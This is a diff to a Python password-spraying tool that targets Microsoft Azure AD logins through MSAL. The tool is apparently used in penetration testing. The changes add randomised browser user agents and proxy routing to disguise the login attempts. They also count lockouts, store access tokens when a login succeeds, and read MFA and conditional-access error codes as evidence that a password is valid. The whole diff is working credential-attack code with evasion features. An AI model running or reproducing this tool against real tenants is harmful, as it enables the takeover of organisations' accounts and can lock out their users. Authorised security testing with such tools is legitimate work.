@@ -1,10 +1,11 @@
-import os
-import sys
 import argparse
 import datetime
-import random
 import itertools
 import json
+import os
+import random
+import sys
+import time
 from json import JSONEncoder
 from msal import PublicClientApplication
 from colorama import Fore
@@ -16,13 +17,15 @@ class Credential:
     auth_timestamp = None
     auth_trace_id = None
     auth_correlation_id = None
+    auth_result_data = None
 
-    def __init__(self, domain, username, password, client_id, endpoint, delay, initial_delay=0):
+    def __init__(self, domain, username, password, client_id, endpoint, user_agent, delay, initial_delay=0):
         self.domain = domain
         self.username = username
         self.password = password
         self.client_id = client_id
         self.endpoint = endpoint
+        self.user_agent = user_agent
         self.delay = delay
         self.initial_delay = initial_delay
 
@@ -30,15 +33,27 @@ class Credential:
     def email_address(self):
         return "%s@%s" % (self.username, self.domain)
 
-    def authenticate(self, proxies, verify_ssl):
-
-        auth_app = PublicClientApplication(
-            self.client_id[1], authority="https://login.microsoftonline.com/organizations")
-
-        scopes = ["%s/.default" %
-                  "https://login.microsoftonline.com/organizations"]
+    def authenticate(self, proxy):
 
         print_spray_cred_output(self)
+
+        proxies = None
+        if proxy:
+            proxies = {
+                "http": proxy,
+                "https": proxy,
+            }
+
+        auth_app = PublicClientApplication(
+            self.client_id[1], authority="https://login.microsoftonline.com/organizations", proxies=proxies)
+
+        scopes = ["%s/.default" %
+                  self.endpoint[1]]
+
+        if self.user_agent:
+            auth_app.authority.http_client._http_client.headers[
+                "User-Agent"] = self.user_agent[1]
+
         raw_result = auth_app.acquire_token_by_username_password(
             username=self.email_address, password=self.password, scopes=scopes)
 
@@ -51,27 +66,33 @@ class Credential:
         if "correlation_id" in raw_result:
             self.auth_correlation_id = raw_result["correlation_id"]
 
-        # Error codes that also indicate a successful login; see: https://github.com/AzureAD/microsoft-authentication-library-for-dotnet/wiki/Client-Applications#common-invalid-client-errors
+        # Error codes that also indicate a successful login; see https://github.com/AzureAD/microsoft-authentication-library-for-dotnet/wiki/Client-Applications#common-invalid-client-errors
         auth_complete_success_error_codes = [7000218]
         auth_partial_success_error_codes = [
             50053,
             50055,
             50057,
             50158,
-            50076
+            50076,
+            53003
         ]
 
         auth_complete_success = False
         auth_partial_success = False
 
-        if any(e in raw_result["error_codes"] for e in auth_complete_success_error_codes):
+        result = AuthResult(credential=self)
+
+        if "error_codes" in raw_result:
+            if any(e in raw_result["error_codes"] for e in auth_complete_success_error_codes):
+                auth_complete_success = True
+                auth_partial_success = True
+                raw_result.pop("error")  # remove the error
+            elif any(e in raw_result["error_codes"] for e in auth_partial_success_error_codes):
+                auth_partial_success = True
+        else:
             auth_complete_success = True
             auth_partial_success = True
-            raw_result.pop("error")  # remove the error
-        elif any(e in raw_result["error_codes"] for e in auth_partial_success_error_codes):
-            auth_partial_success = True
 
-        result = AuthResult(credential=self)
         result.set_auth_status(
             complete_success=auth_complete_success, partial_success=auth_partial_success)
 
@@ -81,7 +102,11 @@ class Credential:
         if "error_description" in raw_result:
             result.raw_error_description = raw_result["error_description"]
 
-        result.process_errors()
+        if not auth_complete_success:
+            result.process_errors()
+        else:
+            result.store_tokens(raw_result)
+
         print_spray_cred_output(self, result)
         return result
 
@@ -115,6 +140,7 @@ class AuthResult:
 
     credential = None
     raw_error_description = None
+    auth_token = None
     error_codes = []
 
     def __init__(self, credential):
@@ -150,15 +176,22 @@ class AuthResult:
         elif error_code == 50057:
             message = "Account disabled"
         elif error_code == 50158:
-            message = "External validation failed (conditional access policy)"
+            message = "External validation failed (is there a conditional access policy?)"
         elif error_code == 50076:
             message = "Multi-Factor Authentication Required"
         elif error_code == 50126:
             message = "Invalid credentials"
+        elif error_code == 53003:
+            message = "Conditional access policy prevented access"
+        elif error_code == 65001:
+            message = "Unapproved application requires interactive authentication"
         else:
             message = "An unknown error occurred"
 
         self._auth_error = AuthError(message, error_code)
+
+    def store_tokens(self, token_result):
+        self.auth_token = token_result
 
 
 def print_banner():
@@ -186,10 +219,10 @@ def print_banner():
         "%s███████║%s██║     %s██║  ██║%s██║  ██║%s   ██║   %s██████╔╝%s ██████╔╝%s███████║" % colors_tuple,
         "%s╚══════╝%s╚═╝     %s╚═╝  ╚═╝%s╚═╝  ╚═╝%s   ╚═╝   %s╚═════╝ %s ╚═════╝ %s╚══════╝" % colors_tuple,
         "%30sBy MarkoH17 (https://github.com/MarkoH17)" % colors[3],
-        "%s%sVersion: %s\n" % ((" " * (57 - len(version))), colors[3], version)
+        "%s%sVersion: %s\n%s" % (
+            (" " * (57 - len(version))), colors[3], version, Fore.RESET)
     ]
     [print(line) for line in lines]
-    sys.stdout.write(Fore.RESET)
 
 
 def initialize():
@@ -222,35 +255,33 @@ def initialize():
                         help="Delay in seconds to wait between authentication attempts", default=30)
     parser.add_argument("--lockout", type=int,
                         help="Number of account lockouts to observe before aborting spraying session (disable with 0)", default=5)
-    parser.add_argument("--logging", type=bool,
-                        help="Enable logging to a file", default=True)
 
     parser.add_argument(
         "--proxy", type=str, help="HTTP Proxy URL (format: http[s]://proxy.address:port)")
 
-    parser.add_argument("--stop_on_success", type=bool,
-                        help="Stop password spraying after identifying first usable credential", default=False)
-
-    parser.add_argument("-k", "--verify_ssl", type=bool,
-                        help="Enforce valid SSL certificates", default=False)
-
-    parser.add_argument("-cid", "--aad_client", type=str,
+    parser.add_argument("-cID", "--aad_client", type=str,
                         help="Client ID used during authentication workflow (None for random selection, specify multiple in a comma-separated string)", default=None, required=False)
 
-    parser.add_argument("-eid", "--aad_endpoint", type=str,
+    parser.add_argument("-eID", "--aad_endpoint", type=str,
                         help="Endpoint ID to specify during authentication workflow (None for random selection, specify multiple in a comma-separated string)", default=None, required=False)
 
-    parser.add_argument("-S", "--shuffle_auth_order", type=bool,
-                        help="Shuffle order of authentication attempts so that each iteration over the user accounts will spray them in a different order, and with a random arrangement of passwords. Be careful with this option, as it reduces the time between successive authentication attempts for a given user to a minimum of DELAY * 1 seconds (a consecutive attempt). Consider using -mD/--min_cred_loop_delay option to enforce a minimum delay", default=False)
+    parser.add_argument("-S", "--shuffle_auth_order",
+                        help="Shuffle order of authentication attempts so that each iteration (User1:Pass1, User2:Pass1, User3:Pass1) will be sprayed in a random order, and with a random arrangement of passwords, e.g (User4:Pass16, User13:Pass25, User19:Pass40). Be aware this option introduces the possibility that the time between consecutive authentication attempts for a given user may occur DELAY seconds apart. Consider using the -mD/--min_cred_loop_delay option to enforce a minimum delay between authentication attempts for any given user.", default=False, action='store_true')
 
     parser.add_argument("-SO", "--shuffle_optimization_attempts", type=int,
                         help="Number of random execution plans to generate for identifying the fastest execution plan", default=10)
 
     parser.add_argument("-mD", "--min_cred_loop_delay", type=int,
-                        help="Minimum time to wait between successive attempts per user authentication attempt (disable with 0)", default=0)
+                        help="Minimum time to wait between authentication attempts for a given user. This option takes into account the time one spray iteration will take, so a pre-authentication delay may not occur every time (disable with 0)", default=0)
 
     parser.add_argument("-R", "--resume_index", type=int,
-                        help="Position in the execution plan to start spraying credentials from", default=0)
+                        help="Resume spraying passwords from this position in the execution plan", default=0)
+
+    user_agent_argument_group = parser.add_mutually_exclusive_group()
+    user_agent_argument_group.add_argument("-cUA", "--custom_user_agent", type=str,
+                                           help="Set custom user agent for authentication requests")
+    user_agent_argument_group.add_argument("-rUA", "--random_user_agent",
+                                           help="Randomize user agent for authentication requests", default=False, action='store_true')
 
     args = parser.parse_args()
     validate_args(args)
@@ -322,17 +353,18 @@ def validate_args(args):
             sys.exit(1)
 
 
-def get_credential_combinations(domain, usernames, passwords, client_ids, endpoint_ids, delay):
+def get_credential_combinations(domain, usernames, passwords, client_ids, endpoint_ids, user_agents, delay):
     combinations = []
 
     client_id_values = list(client_ids.items())
     endpoint_id_values = list(endpoint_ids.items())
+    user_agent_values = list(user_agents.items())
 
     for password in passwords:
         for username in usernames:
             combinations.append(
                 Credential(domain, username, password, random.choice(
-                    client_id_values), random.choice(endpoint_id_values), delay)
+                    client_id_values), random.choice(endpoint_id_values), random.choice(user_agent_values), delay)
             )
     return combinations
 
@@ -404,8 +436,18 @@ def generate_execution_plan(args):
 
     delay = args.delay
 
-    print_info("Generating execution plan for %d credentials.." %
-               (len(user_list) * len(password_list)))
+    print_info("Generating execution plan for %d credentials with a %ds delay after each attempt..." %
+               ((len(user_list) * len(password_list)), delay))
+
+    if not args.aad_client:
+        print_info("Execution plan will use random AAD client IDs")
+    else:
+        print_info("Execution plan will use the provided AAD client ID(s)")
+
+    if not args.aad_endpoint:
+        print_info("Execution plan will use random AAD endpoint IDs")
+    else:
+        print_info("Execution plan will use the provided AAD endpoint ID(s)")
 
     spray_duration = len(user_list) * len(password_list) * delay
 
@@ -481,10 +523,36 @@ def generate_execution_plan(args):
         endpoint_ids = process_custom_aad_values(
             "custom_eid_", args.aad_endpoint)
 
+    user_agents = {
+        "default": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36"
+    }
+
+    if args.custom_user_agent:
+        user_agents = {
+            "custom_user_agent": args.custom_user_agent
+        }
+    elif args.random_user_agent:
+        user_agents = {
+            "android": "Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.50 Mobile Safari/537.36",
+            "apple_iphone_safari": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1",
+            "apple_mac_firefox": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:94.0) Gecko/20100101 Firefox/94.0",
+            "linux_firefox": "Mozilla/5.0 (X11; Linux i686; rv:94.0) Gecko/20100101 Firefox/94.0",
+            "win_chrome_win10": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36",
+            "win_ie11_win7": "Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko",
+            "win_ie11_win8": "Mozilla/5.0 (Windows NT 6.2; Trident/7.0; rv:11.0) like Gecko",
+            "win_ie11_win8.1": "Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko",
+            "win_ie11_win10": "Mozilla/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0) like Gecko",
+            "win_edge_win10": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 Edg/95.0.1020.44"
+        }
+
     auth_creds = {}
 
+    if args.shuffle_auth_order and not args.min_cred_loop_delay:
+        print_warning(
+            "This random execution plan does not enforce a minimum cred loop delay (-mD / --min_cred_loop_delay). This may cause account lockouts!!!")
+
     if args.shuffle_auth_order:
-        optimization_tries = args.shuffle_optimization_attempts
+        optimization_tries = args.shuffle_optimization_attempts if args.min_cred_loop_delay else 1
 
         temp_auth_creds = {}
         possible_auth_creds = {}
@@ -493,7 +561,7 @@ def generate_execution_plan(args):
             print_info("Generated potential execution plan %d/%d" %
                        (i+1, optimization_tries))
             raw_combinations = get_credential_combinations(
-                domain, user_list, password_list, client_ids, endpoint_ids, delay)
+                domain, user_list, password_list, client_ids, endpoint_ids, user_agents, delay)
             # Generate all combinations of users passwords, then
             # Group them into entire sets of users
             auth_combinations_by_user = group_credential_combinations_by_key(
@@ -543,7 +611,7 @@ def generate_execution_plan(args):
 
     else:
         raw_combinations = get_credential_combinations(
-            domain, user_list, password_list, client_ids, endpoint_ids, delay)
+            domain, user_list, password_list, client_ids, endpoint_ids, user_agents, delay)
 
         auth_combinations_by_password = group_credential_combinations_by_key(
             raw_combinations, lambda cred: cred.password)
@@ -614,7 +682,7 @@ def spray_execution_plan(args):
                number_of_creds_to_spray)
 
     if resume_index and resume_index > number_of_creds_to_spray:
-        print_error("Resume index '%d' is larger than the number of credentials (%d) in the execution plan % " % (
+        print_error("Resume index '%d' is larger than the number of credentials (%d) in the execution plan" % (
             resume_index, number_of_creds_to_spray))
 
     if resume_index:
@@ -632,23 +700,43 @@ def spray_execution_plan(args):
     lockout_threshold = args.lockout
     if lockout_threshold:
         print_info("Lockout threshold is set to %d accounts" %
-                   (lockout_threshold))
+                   lockout_threshold)
     else:
         print_warning("Lockout threshold is disabled")
+
+    proxy_url = args.proxy
+    if proxy_url:
+        print_info("Proxy (HTTP/HTTPS) set to '%s'" % proxy_url)
 
     print_info("Starting to spray credentials")
 
     global global_spray_size
-    global_spray_size = len(auth_creds)
-
     global global_spray_idx
+    global global_lockouts_observed
+
+    global_spray_size = len(auth_creds)
     global_spray_idx = 1
+    global_lockouts_observed = 0
 
     auth_results = []
-    for attempt_idx, attempt in enumerate(auth_creds):
-        result = attempt.authenticate(None, None)
+    for cred in auth_creds:
+
+        time.sleep(cred.initial_delay)
+
+        result = cred.authenticate(proxy_url)
         auth_results.append(result)
+
+        if result.auth_error.error_code == 50053:
+            global_lockouts_observed += 1
+
+        if lockout_threshold and global_lockouts_observed >= lockout_threshold:
+            print_error("Lockout threshold reached, aborting password spray")
+
         global_spray_idx += 1
+
+        if global_spray_idx < global_spray_size:
+            time.sleep(cred.delay)
+
     export_auth_results(auth_results)
 
 
@@ -672,7 +760,7 @@ def print_warning(message):
           (Fore.YELLOW, get_time_str(), message))
 
 
-def print_info(message, success=False):
+def print_info(message):
     print("%s[%s - INFO]: %s" %
           (Fore.LIGHTBLUE_EX,
            get_time_str(),
@@ -681,37 +769,58 @@ def print_info(message, success=False):
 
 def print_spray_cred_output(credential, auth_result=None):
     if auth_result is None:
-        status = "%s(...)" % Fore.BLUE
+        status = "%s(waiting...)" % Fore.BLUE
     elif auth_result.auth_complete_success:
-        status = "%s(Success)" % Fore.GREEN
+        status = "%s(Authentication Success)" % Fore.GREEN
     elif auth_result.auth_partial_success:
-        status = "%s(Partial Success)" % Fore.LIGHTYELLOW_EX
+        status = "%s(Partial Success: %s)" % (
+            Fore.LIGHTYELLOW_EX, auth_result.auth_error.error_message)
     else:
         status = "%s(Failed: %s)" % (
             Fore.RED, auth_result.auth_error.error_message)
 
     spray_index = str(global_spray_idx).zfill(len(str(global_spray_size)))
 
-    suffix = "\r" if not auth_result else None
+    line_terminator = "\r" if not auth_result else None
+    flush_line = True if auth_result else False
 
-    print("%s[%s - SPRAY %s/%d] (%s%s%s->%s%s%s): %s%s / %s%s %s" %
+    print_spray_output(
+        spray_index,
+        global_spray_size,
+        credential.client_id[0],
+        credential.endpoint[0],
+        credential.user_agent[0],
+        credential.username,
+        credential.password,
+        status,
+        line_terminator,
+        flush_line
+    )
+
+
+def print_spray_output(spray_idx, spray_cnt, client_id, endpoint_id, user_agent, username, password, status_message, line_terminator, flush):
+    print("%s[%s - SPRAY %s/%d] (%s%s%s->%s%s%s->%s%s%s): %s%s / %s%s %s%s" %
           (
               Fore.LIGHTBLUE_EX,
               get_time_str(),
-              spray_index,
-              global_spray_size,
+              spray_idx,
+              spray_cnt,
+              Fore.LIGHTRED_EX,
+              user_agent,
+              Fore.LIGHTBLUE_EX,
               Fore.LIGHTCYAN_EX,
-              credential.client_id[0],
+              client_id,
               Fore.LIGHTBLUE_EX,
               Fore.LIGHTGREEN_EX,
-              credential.endpoint[0],
+              endpoint_id,
               Fore.LIGHTBLUE_EX,
               Fore.LIGHTMAGENTA_EX,
-              credential.username,
+              username,
               Fore.LIGHTMAGENTA_EX,
-              credential.password,
-              status
-          ), end=suffix, flush=True if auth_result else False)
+              password,
+              status_message,
+              Fore.RESET
+          ), end=line_terminator, flush=flush)
 
 
 def get_time_str():
